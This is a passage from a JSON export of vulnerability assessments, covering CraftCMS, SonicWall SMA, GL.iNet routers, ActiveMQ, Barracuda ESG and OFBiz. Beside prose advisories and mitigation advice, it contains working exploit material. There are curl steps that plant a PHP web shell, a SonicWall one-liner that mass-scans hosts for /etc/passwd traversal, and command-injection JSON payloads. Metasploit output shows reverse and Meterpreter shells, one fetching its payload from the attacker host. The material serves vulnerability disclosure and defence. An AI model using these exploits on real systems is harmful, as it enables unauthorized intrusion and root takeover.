-x localhost:8080 -X POST -H 'Content-Type: multipart/form-data' -F 'action=conditions/render' -F 'configObject[class]=craft\\elements\\conditions\\ElementCondition' -F 'config={\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"msl:/dev/null\"}}}' -F 'filename=@pawn.msl'\r\n```\r\n**Step 4:**\r\nTrigger the `MSL` file execution using `Imagick` constructor class again.\r\nYou should see the vulnerable PNG getting downloaded from the attacker machine and copied to `shell.php` on the `CraftCMS` instance.\r\n```shell\r\ncurl -sk \"https://craftcms-vuln.ddev.site\" -x localhost:8080 -X POST -d 'action=conditions/render&configObject[class]=craft\\elements\\conditions\\ElementCondition&config={\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:/tmp/php*\"}}}'\r\n```\r\n**Step 5:**\r\nRun the vulnerable shell code (`shell.php`) and you should see the `phpinfo` back in the response.\r\n```shell\r\ncurl -k \"https://craftcms-vuln.ddev.site/shell.php\" -x localhost:8080 --output -\r\n```\r\nAnd things get even better, because you can avoid the out of band download by using `caption:` and `info:` schemes. The combination of both allows to create a web shell in one go using the `MSL` syntax below.\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<image>\r\n <read filename=\"caption:&lt;?php phpinfo(); ?&gt;\" />\r\n <write filename=\"info:/var/www/html/web/shell.php\" />\r\n</image>\r\n```\r\nI have created a Metasploit module that checks the vulnerability of a target and makes use of the vulnerability to exploit the target. It allows you to choose from different target options such as deploying and launching a PHP webshell, performing a UNIX command injection or launching native Linux Meterpreter.\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/craftcms_unauth_rce_cve_2023_41892.rb) in my local repository or as [PR 18612](https://github.com/rapid7/metasploit-framework/pull/18612) at the Metasploit Github development.\r\n\r\n### Mitigation\r\nYou should update your `CraftCMS` application to the latest version or at least to `4.4.15`.\r\n\r\n### References\r\n[CVE-2023-41892](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-41892)\r\n[CraftCMS RCE analysis](https://blog.calif.io/p/craftcms-rce)\r\n[CraftCMS Advisory](https://github.com/advisories/GHSA-4w8r-3xrw-v25g)\r\n[Exploiting Arbitrary Object Instantiations in PHP without Custom Classes](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)\r\n[CraftCMS Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/craftcms_unauth_rce_cve_2023_41892.rb)\r\n[CraftCMS Unauthenticated RCE - Metasploit PR 18612](https://github.com/rapid7/metasploit-framework/pull/18612)\r\n[CraftCMS Installation](https://craftcms.com/docs/getting-started-tutorial/install/)\r\n[CraftCMS downloading previous versions](https://craftcms.com/knowledge-base/downloading-previous-craft-versions)\r\n\r\n\r\n### Credits\r\n* `thanhc - https://substack.com/@thanhc`  discovery of the vulnerability\r\n* `Arseniy Sharoglazov - https://swarm.ptsecurity.com/author/arseniy-sharoglazov/`\r\n* `chybeta - https://github.com/chybeta`\r\n\r\n\r\n\r\n ",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Discovery",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "68342ac4-8437-4340-aced-84d86ea40df0",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "9ce9f86a-50bf-499f-a689-924ba529bbcc",
      "created": "2023-12-19T09:40:34.542329Z",
      "revisionDate": "2023-12-19T09:40:34.542452Z",
      "document": "SonicWall Secure Mobile Access (SMA) 1000 series contains a pre-authentication path traversal vulnerability. This flaw could potentially allow an unauthenticated attacker to access files and directories stored outside the web root directory.\r\n\r\nThis vulnerability could enable an attacker to traverse the file system and gain unauthorized access to sensitive files and directories. Note: this vulnerability solely affects SMA 1000 firmware version 12.4.2.\r\n\r\nPoC: cat file.txt| while read host do;do curl -sk \"http://$host:8443/images//////////////////../../../../../../../../etc/passwd\" | grep -i 'root:' && echo $host \"Vulnerable\";done\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a1a1fdcc-eaf6-4bb6-94a7-edb0cb69ca09",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "e3bcbf0b-9d04-4e57-b920-49298538d28f",
      "created": "2023-12-19T12:48:07.045061Z",
      "revisionDate": "2023-12-19T17:47:31.614575Z",
      "document": "This can be used to recover secret information (Qr codes, passwords, etc.) from a cropped image with Microsoft Windows snipping tool abusing the Acropalypse vulnerability.\r\n\r\nThere are some limitations:\r\n\r\n- Useful only if the cropped information is sensitive\r\n- Limited to the vulnerable screenshot software\r\n- Must be cropped\r\n- Patched by Microsoft",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "6391e374-1e7f-4b15-b299-bc3b47128d9d",
      "editorId": "25106ab9-2514-4358-9c90-3f04733bb8fc",
      "topicId": "fa462bf2-4fb6-4fd0-96f0-cee042e36717",
      "created": "2023-12-20T08:34:01.718284Z",
      "revisionDate": "2023-12-20T18:30:43.148941Z",
      "document": "Based on [vendor assessment](https://activemq.apache.org/news/cve-2023-46604) the vulnerability (deserialization of untrusted data) is present in Active MQ *Artemis* too, but the Spring class used in the public exploit is not available in this flavor of the software (only works against ActiveMQ *Classic*). Exploitability of Artemis needs further research.",
      "score": 3,
      "metadata": {},
      "tags": []
    },
    {
      "id": "c29a266b-2fc6-4bf4-a4e0-b75c64af6f55",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "593de58e-d9b7-4ad5-9506-70538067b6b5",
      "created": "2023-12-26T10:10:58.123106Z",
      "revisionDate": "2024-01-12T06:12:30.116079Z",
      "document": "During an investigation by Barracuda, it has been found that an attacker exploited a vulnerability known as Arbitrary Code Execution (ACE) in a third-party library called Spreadsheet::ParseExcel. This vulnerability was used to send a malicious Excel file via email to a select group of ESG devices. \r\n\r\nThe Spreadsheet::ParseExcel library is an open-source tool used in the Amavis virus scanner, which is part of the ESG appliance.\r\n\r\nSpreadsheet::ParseExcel version 0.65 is a Perl module used for parsing Excel files. Spreadsheet::ParseExcel is vulnerable to an arbitrary code execution vulnerability due to passing unvalidated input from a file into a string-type \u201ceval\u201d. Specifically, the issue stems from the evaluation of Number format strings within the Excel parsing logic.\r\n\r\n In cooperation with Mandiant, Barracuda believes this incident is linked to the ongoing efforts of a group associated with China, known as UNC4841.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7bf5ccde-3d3c-49a0-af90-f061a69cb092",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "55d283e2-9183-4a93-8c7e-49d680c5b37d",
      "created": "2024-01-03T08:34:54.390708Z",
      "revisionDate": "2024-01-03T08:34:54.39049Z",
      "document": "CVE-2023-49070 is a critical security vulnerability in Apache OFBiz, a comprehensive open-source enterprise resource planning (ERP) system. This vulnerability is classified as a pre-authentication remote code execution (RCE) issue, primarily stemming from an outdated and no longer maintained XML-RPC component in Apache OFBiz. The specific version affected is 18.12.09, and it is recommended that users upgrade to version 18.12.10 to mitigate the risk\r\n\r\nIn terms of severity, CVE-2023-49070 has a CVSS v3 Base Score of 9.8, which is considered critical. The CVSS scoring vector for this vulnerability indicates that the vulnerability is network exploitable, requires low attack complexity, no privileges, and no user interaction. It has an impact on confidentiality, integrity, and availability, all rated as high.\r\n\r\nAdditionally, the Exploit Prediction Scoring System (EPSS) score for CVE-2023-49070 indicates a 50.12% probability of exploitation activity in the next 30 days. ShadowServer is already observing scans being executed by using an available poc for this vulnerability: https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC. The patch provided for this vulnerability failed to remove root cause of the issue and it is advised to update again for CVE-2023-51467.(https://www.openwall.com/lists/oss-security/2023/12/26/3)\r\n\r\nGiven its critical nature, high likelihood of exploitation, and the potential for significant impact, it's essential for organizations using Apache OFBiz to address this vulnerability promptly.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "c7795d26-0464-417f-88e9-64268a6d10c0",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "6acfcec1-44c3-4fb8-a06a-f0d4318acada",
      "created": "2024-01-03T11:36:58.254202Z",
      "revisionDate": "2024-01-07T19:50:43.959354Z",
      "document": "This report describes the Shell Metacharacter Injection vulnerability recently discovered in GL.iNet products. The vulnerability exists in the `get_system_log` and `get_crash_log` functions of the `logread` module, as well as the `upgrade_online` function of the `upgrade` module. It allows execution of malicious shell commands through externally provided parameters, thereby enabling control over the related products.\r\n\r\nAttackers can manipulate routers by passing malicious shell commands through the API (v4).\r\n\r\n**get_system_log function**\r\n```json\r\n{\r\n\t\"jsonrpc\": \"2.0\",\r\n\t\"id\": 11,\r\n\t\"method\": \"call\",\r\n\t\"params\": [\r\n\t\t\"NsPHdkXtENoaotxVZWLqJorU52O7J0OI\",\r\n\t\t\"logread\",\r\n\t\t\"get_system_log\",\r\n\t\t{\r\n\t\t\t\"lines\": \"| echo pawned >/tmp/lines.pawned\",\r\n\t\t\t\"module\": \"| echo pawned >/tmp/module.pawned\"\r\n\t\t}\r\n\t]\r\n}\r\n```\r\n**get_crash_log function**\r\n```json\r\n{\r\n\t\"jsonrpc\": \"2.0\",\r\n\t\"id\": 11,\r\n\t\"method\": \"call\",\r\n\t\"params\": [\r\n\t\t\"NsPHdkXtENoaotxVZWLqJorU52O7J0OI\",\r\n\t\t\"logread\",\r\n\t\t\"get_crash_log\",\r\n\t\t{\r\n\t\t\t\"mode\": \"| echo pawned >/tmp/mode.pawned\",\r\n\t\t\t\"log_number\": \"| echo pawned >/tmp/log_number.pawned\"\r\n\t\t}\r\n\t]\r\n}\r\n```\r\n**upgrade_online function**\r\n```json\r\n{\r\n\t\"jsonrpc\": \"2.0\",\r\n\t\"id\": 11,\r\n\t\"method\": \"call\",\r\n\t\"params\": [\r\n\t\t\"NsPHdkXtENoaotxVZWLqJorU52O7J0OI\",\r\n\t\t\"upgrade\",\r\n\t\t\"upgrade_online\",\r\n\t\t{\r\n\t\t\t\"url\": \"| echo pawned >/tmp/url.pawned\",\r\n\t\t\t\"sha256\": \"| echo pawned >/tmp/sha256.pawned\",\r\n\t\t\t\"keep_config\": \"| echo pawned >/tmp/keep_config.pawned\",\r\n\t\t\t\"keep_package\": \"| echo pawned >/tmp/keep_package.pawned\"\r\n\t\t}\r\n\t]\r\n}\r\n```\r\nThis vulnerability requires post-authentication with a SessionID (`SID`) to be successful. This authentication can be circumvented by chaining this vulnerability with [CVE-2023-50919](https://attackerkb.com/topics/LdqSuqHKOj/cve-2023-50919) where the `SID` can be retrieved without any credential knowledge, hence making this exploit pre-authenticated.\r\n\r\nI created a new module that determines the GL.iNet device model, firmware information and architecture to check if the device is vulnerable and chained the two vulnerabilities.\r\nI have tested this module using `FirmAE` to emulate a GL.iNet device AR300M16 with firmware `openwrt-ar300m16-4.3.7-0913-1694589994.bin`.\r\n\r\n### Module in Action\r\n**GL.iNet AR300M16 emulated target**\r\n```shell\r\n# ./run.sh -d GL.iNet /root/FirmAE/firmwares/openwrt-ar300m16-4.3.7-0913-1694589994.bin\r\n[*] /root/FirmAE/firmwares/openwrt-ar300m16-4.3.7-0913-1694589994.bin emulation start!!!\r\n[*] extract done!!!\r\n[*] get architecture done!!!\r\nmke2fs 1.47.0 (5-Feb-2023)\r\nmknod: /dev/console: File exists\r\ne2fsck 1.47.0 (5-Feb-2023)\r\n[*] infer network start!!!\r\n\r\n[IID] 91\r\n[MODE] debug\r\n[+] Network reachable on 192.168.1.1!\r\n[+] Run debug!\r\nCreating TAP device tap91_0...\r\nSet 'tap91_0' persistent and owned by uid 0\r\nBringing up TAP device...\r\nStarting emulation of firmware... 192.168.1.1 true false 11.438110994 -1\r\n/root/FirmAE/./debug.py:7: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13\r\n  import telnetlib\r\n[*] firmware - openwrt-ar300m16-4.3.7-0913-1694589994\r\n[*] IP - 192.168.1.1\r\n[*] connecting to netcat (192.168.1.1:31337)\r\n[-] failed to connect netcat\r\n------------------------------\r\n|       FirmAE Debugger      |\r\n------------------------------\r\n1. connect to socat\r\n2. connect to shell\r\n3. tcpdump\r\n4. run gdbserver\r\n5. file transfer\r\n6. exit\r\n> 1\r\n/ #\r\n/ # ifconfig\r\nifconfig\r\nbr-lan    Link encap:Ethernet  HWaddr 52:54:00:12:34:56\r\n          inet addr:192.168.8.1  Bcast:192.168.8.255  Mask:255.255.255.0\r\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\r\n          RX packets:392 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:0\r\n          RX bytes:33970 (33.1 KiB)  TX bytes:0 (0.0 B)\r\n\r\neth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56\r\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\r\n          RX packets:427 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:44 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:1000\r\n          RX bytes:42072 (41.0 KiB)  TX bytes:5068 (4.9 KiB)\r\n\r\neth1      Link encap:Ethernet  HWaddr 52:54:00:12:34:57\r\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:940 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:1000\r\n          RX bytes:0 (0.0 B)  TX bytes:321480 (313.9 KiB)\r\n\r\nlo        Link encap:Local Loopback\r\n          inet addr:127.0.0.1  Mask:255.0.0.0\r\n          inet6 addr: ::1/128 Scope:Host\r\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:0\r\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\r\n\r\n/ # netstat -rn\r\nnetstat -rn\r\nKernel IP routing table\r\nDestination     Gateway         Genmask         Flags   MSS Window  irtt Iface\r\n192.168.8.0     0.0.0.0         255.255.255.0   U         0 0          0 br-lan\r\n```\r\n* You should now be able to `ping` the network address 192.168.8.1 from your host and run a `nmap` command to check the services (HTTP TCP port 80).\r\n* NOTE: please check your tap network interface on your host because it might have the wrong IP setting. \r\n* You can change this with: `ip a del 192.168.1.2/24 dev tap91_0` and `ip a add 192.168.8.2/24 dev tap91_0`.\r\n\r\n```shell\r\n # ifconfig tap91_0\r\ntap91_0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n        inet 192.168.1.2  netmask 255.255.255.0  broadcast 0.0.0.0\r\n        inet6 fe80::6c06:aff:fefb:ab29  prefixlen 64  scopeid 0x20<link>\r\n        ether 6e:06:0a:fb:ab:29  txqueuelen 1000  (Ethernet)\r\n        RX packets 39  bytes 4692 (4.5 KiB)\r\n        RX errors 0  dropped 0  overruns 0  frame 0\r\n        TX packets 50  bytes 4044 (3.9 KiB)\r\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n```\r\n```shell\r\n# ping 192.168.8.1\r\nPING 192.168.8.1 (192.168.8.1) 56(84) bytes of data.\r\n64 bytes from 192.168.8.1: icmp_seq=1 ttl=64 time=9.2 ms\r\n64 bytes from 192.168.8.1: icmp_seq=2 ttl=64 time=3.18 ms\r\n^C\r\n--- 192.168.8.1 ping statistics ---\r\n2 packets transmitted, 2 received, 0% packet loss, time 1001ms\r\nrtt min/avg/max/mdev = 2.384/5.650/8.916/3.266 ms\r\n# nmap 192.168.8.1\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 14:47 UTC\r\nNmap scan report for 192.168.8.1\r\nHost is up (0.020s latency).\r\nNot shown: 997 closed tcp ports (reset)\r\nPORT    STATE SERVICE\r\n53/tcp  open  domain\r\n80/tcp  open  http\r\n443/tcp open  https\r\nMAC Address: 52:54:00:12:34:57 (QEMU virtual NIC)\r\n```\r\nYou are now ready to test the module using the emulated router hardware on IP address 192.168.8.1.\r\n\r\n```shell\r\nmsf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > info\r\n\r\n       Name: GL.iNet Unauthenticated Remote Command Execution via the logread module.\r\n     Module: exploit/linux/http/glinet_unauth_rce_cve_2023_50445\r\n   Platform: Unix, Linux\r\n       Arch: cmd, mipsle, mipsbe, armle\r\n Privileged: Yes\r\n    License: Metasploit Framework License (BSD)\r\n       Rank: Excellent\r\n  Disclosed: 2013-12-10\r\n\r\nProvided by:\r\n  h00die-gr3y <h00die.gr3y@gmail.com>\r\n  Unknown\r\n  DZONERZY\r\n\r\nModule side effects:\r\n ioc-in-logs\r\n artifacts-on-disk\r\n\r\nModule stability:\r\n crash-safe\r\n\r\nModule reliability:\r\n repeatable-session\r\n\r\nAvailable targets:\r\n      Id  Name\r\n      --  ----\r\n  =>  0   Unix Command\r\n      1   Linux Dropper\r\n\r\nCheck supported:\r\n  Yes\r\n\r\nBasic options:\r\n  Name     Current Setting  Required  Description\r\n  ----     ---------------  --------  -----------\r\n  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]\r\n  RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\r\n  RPORT    80               yes       The target port (UDP)\r\n  SID                       no        Session ID\r\n  SSL      false            no        Negotiate SSL/TLS for outgoing connections\r\n  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)\r\n  URIPATH                   no        The URI to use for this exploit (default is random)\r\n  VHOST                     no        HTTP server virtual host\r\n\r\n\r\n  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:\r\n\r\n  Name     Current Setting  Required  Description\r\n  ----     ---------------  --------  -----------\r\n  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen o\r\n                                      n all addresses.\r\n  SRVPORT  8080             yes       The local port to listen on.\r\n\r\nPayload information:\r\n\r\nDescription:\r\n  A command injection vulnerability exists in multiple GL.iNet network products, allowing an attacker\r\n  to inject and execute arbitrary shell commands via JSON parameters at the `gl_system_log` and `gl_crash_log`\r\n  interface in the `logread` module.\r\n  This exploit requires post-authentication using the `Admin-Token` cookie/sessionID (`SID`), typically stolen\r\n  by the attacker.\r\n  However, by chaining this exploit with vulnerability CVE-2023-50919, one can bypass the Nginx authentication\r\n  through a `Lua` string pattern matching and SQL injection vulnerability. The `Admin-Token` cookie/`SID` can be\r\n  retrieved without knowing a valid username and password.\r\n\r\n  The following GL.iNet network products are vulnerable:\r\n  - A1300, AX1800, AXT1800, MT3000, MT2500/MT2500A: v4.0.0 < v4.5.0;\r\n  - MT6000: v4.5.0 - v4.5.3;\r\n  - MT1300, MT300N-V2, AR750S, AR750, AR300M, AP1300, B1300: v4.3.7;\r\n  - E750/E750V2, MV1000: v4.3.8;\r\n  - and potentially others (just try ;-)\r\n\r\n  NOTE: Staged meterpreter payloads might core dump on the target, so use stage-less meterpreter payloads\r\n  when using the Linux Dropper target.\r\n\r\nReferences:\r\n  https://nvd.nist.gov/vuln/detail/CVE-2023-50445\r\n  https://nvd.nist.gov/vuln/detail/CVE-2023-50919\r\n  https://attackerkb.com/topics/3LmJ0d7rzC/cve-2023-50445\r\n  https://attackerkb.com/topics/LdqSuqHKOj/cve-2023-50919\r\n  https://libdzonerzy.so/articles/from-zero-to-botnet-glinet.html\r\n  https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Using%20Shell%20Metacharacter%20Injection%20via%20API.md\r\n\r\n\r\nView the full module info with the info -d command.\r\n```\r\n### Scenarios\r\n**FirmAE GL.iNet AR300M16 Router Emulation Unix Command -  cmd/unix/reverse_netcat**\r\n```shell\r\nmsf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > set target 0\r\ntarget => 0\r\nmsf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.8.2:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Checking if 192.168.8.1:80 can be exploited.\r\n[!] The service is running, but could not be validated. Product info: |4.3.7|n/a\r\n[*] SID: NsPHdkXtENoaotxVZWLqJorU52O7J0OI\r\n[*] Executing Unix Command for cmd/unix/reverse_netcat\r\n[*] Command shell session 8 opened (192.168.8.2:4444 -> 192.168.8.1:53167) at 2024-01-03 11:12:18 +0000\r\n\r\npwd\r\n/\r\nid\r\nuid=0(root) gid=0(root) groups=0(root),65533(nonevpn)\r\nuname -a\r\nLinux GL- 4.1.17+ #28 Sat Oct 31 17:56:39 KST 2020 mips GNU/Linux\r\nexit\r\n```\r\n**FirmAE GL.iNet AR300M16 Router Emulation Linux Dropper -  linux/mipsbe/meterpreter_reverse_tcp**\r\n```shell\r\nmsf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > set target 1\r\ntarget => 1\r\nmsf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.8.2:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Checking if 192.168.8.1:80 can be exploited.\r\n[!] The service is running, but could not be validated. Product info: |4.3.7|n/a\r\n[*] SID: Gs2KPnIsIQQUzHQkEBVN8JOcq5nV008e\r\n[*] Executing Linux Dropper for linux/mipsbe/meterpreter_reverse_tcp\r\n[*] Using URL: http://192.168.8.2:1981/OrfVHM15cua0w\r\n[*] Client 192.168.8.1 (curl/7.88.1) requested /OrfVHM15cua0w\r\n[*] Sending payload to 192.168.8.1 (curl/7.88.1)\r\n[*] Meterpreter session 9 opened (192.168.8.2:4444 -> 192.168.8.1:48511) at 2024-01-03 08:30:52 +0000\r\n[*] Command Stager progress - 100.00% done (117/117 bytes)\r\n[*] Server stopped.\r\n\r\nmeterpreter > getuid\r\nServer username: root\r\nmeterpreter > sysinfo\r\nComputer     : 192.168.8.1\r\nOS           :  (Linux 4.1.17+)\r\nArchitecture : mips\r\nBuildTuple   : mips-linux-muslsf\r\nMeterpreter  : mipsbe/linux\r\nmeterpreter > \r\n```\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/glinet_unauth_rce_cve_2023_50445.rb) in my local repository or as [PR 18648](https://github.com/rapid7/metasploit-framework/pull/18648) at the Metasploit Github development.\r\n\r\n### Mitigation\r\nThe following GL.iNet network devices are vulnerable. Please patch your devices to the latest firmware release.\r\n - A1300, AX1800, AXT1800, MT3000, MT2500/MT2500A => `v4.0.0 < v4.5.0`\r\n - MT6000 => `v4.5.0 - v4.5.3`\r\n - MT1300, MT300N-V2, AR750S, AR750, AR300M, AP1300, B1300 => `v4.3.7`\r\n - E750/E750V2, MV1000 => `v4.3.8`\r\n -  X3000: `v4.0.0 - v4.4.2`\r\n - XE3000: `v4.0.0 - v4.4.3`\r\n - SFT1200: `v4.3.6`\r\n - and potentially others...\r\n\r\n### References\r\n[CVE-2023-50445](https://nvd.nist.gov/vuln/detail/CVE-2023-50445)\r\n[AttackerKB article: CVE-2023-50919 by h00die-gr3y](https://attackerkb.com/topics/LdqSuqHKOj/cve-2023-50919)\r\n[From zero to botnet: GL.iNet going wild by DZONERZY](https://libdzonerzy.so/articles/from-zero-to-botnet-glinet.html)\r\n[GL.iNet home page](https://www.gl-inet.com/)\r\n[GL.iNet API 3.x documentation](https://dev.gl-inet.com/router-3.x-api/)\r\n[GL.iNet API 4.x documentation](https://dev.gl-inet.com/router-4.x-api/)\r\n[GL.iNet unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/glinet_unauth_rce_cve_2023_50445.rb)\r\n[GL.iNet unauthenticated RCE - Metasploit PR 18648](https://github.com/rapid7/metasploit-framework/pull/18648)\r\n[FirmAE](https://github.com/pr0v3rbs/FirmAE)\r\n[FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis](https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf)\r\n\r\n### Credits\r\n* `DZONERZY`\r\n\r\nAnd to all other good fellows who raised this concern ;-)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ae4e1e4a-8775-4d8d-adc9-bcf6e9546117",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "fc6796a8-370e-42d3-82f5-59fd16d3c43f",
      "created": "2024-01-03T11:39:31.558701Z",
